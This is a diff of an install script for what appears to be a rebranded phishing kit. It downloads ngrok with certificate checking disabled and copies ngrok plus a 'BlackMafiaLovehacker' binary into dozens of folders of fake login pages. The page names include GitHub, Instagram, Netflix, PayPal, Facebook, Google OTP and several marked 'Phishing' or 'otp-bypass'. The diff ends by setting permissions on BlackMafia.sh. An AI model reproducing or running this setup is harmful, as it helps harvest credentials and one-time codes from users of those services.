@@ -26,39 +26,39 @@ apt install gnome-terminal -y
 clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
 unzip ngrok-stable-linux-amd64.zip
-cp -R ngrok secnhack sites/github/
-cp -R ngrok secnhack sites/Hotstar-otp-bypass/
-cp -R ngrok secnhack sites/instagram/
-cp -R ngrok secnhack sites/Linkedin/
-cp -R ngrok secnhack sites/Netflix/
-cp -R ngrok secnhack sites/Paytm-Phishing/paytm/
-cp -R ngrok secnhack sites/Paytm-Phishing/signup/
-cp -R ngrok secnhack sites/spotify/
-cp -R ngrok secnhack sites/whatsapp-phishing/
-cp -R ngrok secnhack sites/facebook/
-cp -R ngrok secnhack sites/google-otp/
-cp -R ngrok secnhack sites/instafollow/
-cp -R ngrok secnhack sites/ipfinder/
-cp -R ngrok secnhack sites/ola-otpbypass/
-cp -R ngrok secnhack sites/UberEats-Phishing/
-cp -R ngrok secnhack sites/Zomato-Phishing/
-cp -R ngrok secnhack sites/amazonsign/
-cp -R ngrok secnhack sites/tiktok/
-cp -R ngrok secnhack sites/phonepay/
-cp -R ngrok secnhack sites/paypal/
-cp -R ngrok secnhack sites/telegram/
-cp -R ngrok secnhack sites/twitter/
-cp -R ngrok secnhack sites/flipcart/
-cp -R ngrok secnhack sites/wordpress/
-cp -R ngrok secnhack sites/snapchat/
-cp -R ngrok secnhack sites/protonmail/
-cp -R ngrok secnhack sites/stackoverflow/
-cp -R ngrok secnhack sites/ebay/
-cp -R ngrok secnhack sites/twitch/
-cp -R ngrok secnhack sites/ajio/
-cp -R ngrok secnhack sites/cryptocurrency/
-cp -R ngrok secnhack sites/mobikwik/
-cp -R ngrok secnhack sites/pinterest/
+cp -R ngrok BlackMafiaLovehacker Sites/github/
+cp -R ngrok BlackMafiaLovehacker Sites/Hotstar-otp-bypass/
+cp -R ngrok BlackMafiaLovehacker Sites/instagram/
+cp -R ngrok BlackMafiaLovehacker Sites/Linkedin/
+cp -R ngrok BlackMafiaLovehacker Sites/Netflix/
+cp -R ngrok BlackMafiaLovehacker Sites/Paytm-Phishing/paytm/
+cp -R ngrok BlackMafiaLovehacker Sites/Paytm-Phishing/signup/
+cp -R ngrok BlackMafiaLovehacker Sites/spotify/
+cp -R ngrok BlackMafiaLovehacker Sites/whatsapp-phishing/
+cp -R ngrok BlackMafiaLovehacker Sites/facebook/
+cp -R ngrok BlackMafiaLovehacker Sites/google-otp/
+cp -R ngrok BlackMafiaLovehacker Sites/instafollow/
+cp -R ngrok BlackMafiaLovehacker Sites/ipfinder/
+cp -R ngrok BlackMafiaLovehacker Sites/ola-otpbypass/
+cp -R ngrok BlackMafiaLovehacker Sites/UberEats-Phishing/
+cp -R ngrok BlackMafiaLovehacker Sites/Zomato-Phishing/
+cp -R ngrok BlackMafiaLovehacker Sites/amazonsign/
+cp -R ngrok BlackMafiaLovehacker Sites/tiktok/
+cp -R ngrok BlackMafiaLovehacker Sites/phonepay/
+cp -R ngrok BlackMafiaLovehacker Sites/paypal/
+cp -R ngrok BlackMafiaLovehacker Sites/telegram/
+cp -R ngrok BlackMafiaLovehacker Sites/twitter/
+cp -R ngrok BlackMafiaLovehacker Sites/flipcart/
+cp -R ngrok BlackMafiaLovehacker Sites/wordpress/
+cp -R ngrok BlackMafiaLovehacker Sites/snapchat/
+cp -R ngrok BlackMafiaLovehacker Sites/protonmail/
+cp -R ngrok BlackMafiaLovehacker Sites/stackoverflow/
+cp -R ngrok BlackMafiaLovehacker Sites/ebay/
+cp -R ngrok BlackMafiaLovehacker Sites/twitch/
+cp -R ngrok BlackMafiaLovehacker Sites/ajio/
+cp -R ngrok BlackMafiaLovehacker Sites/cryptocurrency/
+cp -R ngrok BlackMafiaLovehacker Sites/mobikwik/
+cp -R ngrok BlackMafiaLovehacker Sites/pinterest/
 chmod 7777 BlackMafia.sh
 clear
 echo ""
